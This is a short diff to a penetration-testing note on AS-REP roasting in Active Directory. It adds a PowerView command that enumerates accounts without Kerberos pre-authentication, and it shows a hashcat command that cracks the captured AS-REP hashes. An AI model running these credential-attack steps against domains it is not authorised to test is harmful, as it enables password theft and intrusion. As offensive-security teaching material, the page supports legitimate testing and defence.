@@ -30,6 +30,13 @@ This attack can be performed without any initial domain account. Nevertheless, a
 
 ## Exploit
 
+To enumerate vulnerable accounts, use following command. It's also possible to do with with `BloodHound`.
+
+```bash
+# Using PowerView from a domain joined computer.
+Get-DomainUser -PreauthNotRequired -verbose
+```
+
 If domain contains accounts vulnerable to AS-REP roasting, request the AS-REP for concerned domain users on a targeted domain controller with `Rubeus` or `impacket-GetNPUsers`.
 
 ```bash
@@ -48,6 +55,8 @@ Then, crack the AS-REP hash. You can use `hashcat` to do that.
 ```bash
 sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
+
+
 
 ## Recommendations
 
